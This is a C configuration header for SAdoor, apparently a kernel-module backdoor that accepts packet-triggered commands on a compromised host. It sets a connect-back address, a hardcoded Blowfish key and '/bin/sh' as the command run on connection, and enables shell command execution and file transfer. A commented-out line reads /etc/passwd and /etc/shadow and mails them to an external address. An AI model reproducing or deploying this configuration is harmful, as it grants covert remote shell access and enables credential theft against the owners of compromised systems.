/*
 *  File: sakmod_conf.h 
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod configuration file.
 *  Version: 1.0
 *  Date: Thu Jul  3 16:14:31 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef _SAKMOD_CONF_H
#define _SAKMOD_CONF_H


/*
 * The IPv4 address to use when establishing a connection to a client.
 * This is also used as a key in the client database.
 */
#define SAKMOD_IPV4_ADDR            "192.168.1.11"

/*
 * Verbose level of log messages in range 1-3.
 * Undefine to disable logging.
 */
#define SAKMOD_VERBOSE                3

/*
 * The 448 bit (no more, no less) Blowfish key.
 */
#define SAKMOD_BFISH_KEY  \
        "\x43\x4d\x4e\x20\x77\x61\x6e\x74" \
        "\x27\x73\x20\x61\x20\x6a\x6f\x62" \
        "\x20\x69\x6e\x20\x43\x61\x6c\x69" \
        "\x66\x6f\x72\x6e\x69\x61\x2c\x20" \
        "\x6f\x72\x20\x73\x6f\x6d\x65\x20" \
        "\x6f\x74\x68\x65\x72\x20\x77\x61" \
        "\x72\x6d\x20\x70\x6c\x61\x63\x65"
/*
 * The interface to put in promiscous mode (if any).
 * (Note that the interface could be in promiscous mode for 
 * some other reason)
 */
/* #define SAKMOD_IFACE_RUN_PROMISC    "le1" */

/*
 * Set to 1 to refuse to run shell commands received in the 
 * payload of the command packet.
 */
#define SAKMOD_NOSINGLE_FLAG        0

/*
 * Set to 1 to refuse passive mode/accept command 
 * (SAdoor will refuse to listen on a port).
 */
#define SAKMOD_NOACCEPT_FLAG        0

/*
 * Set to 1 to refuse to connect back to a client.
 */
#define SAKMOD_NOCONNECT_FLAG        0

/*
 * Number of seconds to wait for all packets after the 
 * first is received.
 * If timed out, all packets have to be sent again. 
 * set to zero to wait forever.
 */
#define SAKMOD_PACKETS_TIMEOUT_SEC    15

/*
 * Number of seconds to wait for a connecting client.
 */
#define SAKMOD_CONNECTION_TIMEOUT   30

/*
 * Set to 1 to disable file transfer mode.
 */
#define SAKMOD_NOFILETRANS            0

/*
 * Command to run upon connection (no arguments!).
 */
#define SAKMOD_RUNONCONNECT                "/bin/sh"

/*
 * Command to run when a command packet without a command 
 * is received. Note that only the knowledge of which key 
 * packets to send is required to run this command, use with
 * caution.
 */
/* #define SAKMOD_NULLCOMMAND    "{ uname -a;cat /etc/passwd;cat /etc/shadow||cat /etc/master.passwd; }|mailx -s sadoor.pw cmn@darklab.org" */

/*
 * Define to enable protection against replay attacks.
 *
 * If defined,  SAdoor will refuse to run any  command
 * received  with  a timestamp (seconds and micro seconds
 * in GMT) less or equal to the previous one.  The times-
 * tamp  on the first command-packets is compared against
 * the time that SAdoor  were  started.   This  obviously
 * requires that clients and SAdoor is synced in time.
 *
 * Since  a  packet with a bad timestamp could be a clock
 * skew, SAdoor keeps a list of the last  100  timestamps
 * received.  If any bad timestamp matches a timestamp in
 * that list the command  is  supposed  to  be  a  replay
 * attack.
 *
 */
#define SAKMOD_ENABLE_REPLAY_PROTECTION     

/*
 * Set this to the gid of the tty group (if any) to get
 * correct permissions on tty device.
 */
#define SAKMOD_TTY_GROUP    (-1)

/*****************************************************************************
 *                     Nothing to change below                               *
 *****************************************************************************/

#define VERSION "0.95-KMOD"

/* Name of sub process */
#define SAKMOD_PROC_NAME       "sadoor"

/* Name of command handler kernel thread */
#define SAKMOD_KTHREAD_NAME    "sadoor_cmd_handler"

/* For RUN command */
#define SAKMOD_UMASK            0022

/* Debug level 1-3 */
/* #define SAKMOD_DEBUG         3 */


#endif /* _SAKMOD_CONF_H */
